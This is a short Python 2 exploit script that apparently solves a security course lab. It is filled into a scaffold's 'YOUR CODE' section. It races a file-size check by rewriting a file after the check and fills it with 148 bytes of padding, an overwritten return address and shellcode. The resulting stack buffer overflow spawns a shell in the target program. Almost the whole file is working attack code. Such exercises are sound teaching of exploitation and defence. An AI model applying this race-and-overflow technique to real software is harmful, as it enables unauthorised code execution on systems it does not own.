#!/usr/bin/env python2

from scaffold import *

### YOUR CODE STARTS HERE ###

# write anything to the file so long as it's less than MAX_BUFSIZE
f = open("hack", "w")
f.write("junk\n")
f.flush()
f.close()

# start program again
p.start()

# receive stalls until first print statement (like a break point)
p.recv(5)

# scanf on line 35 then stalls and while that's happening we can change
# the contents of the file hehe
junk = "a" * 148
rip = "\xe0\xfc\xff\xbf"
alltogether  = junk + rip + SHELLCODE + "\n"
f = open("hack", "w")
f.write(alltogether)
f.flush()
f.close()

# send the size of our file (could probably still work if larger)
p.send("240\n")

#assert p.recvline() == 'How many bytes should I read? Here is the file!'
#print p.recvline()
#assert p.recvline() == 'Hello world!'

### YOUR CODE  ENDS  HERE ###

returncode = p.end()

if returncode == -11: print 'segmentation fault or stack canary!'
elif returncode != 0: print 'return code', returncode
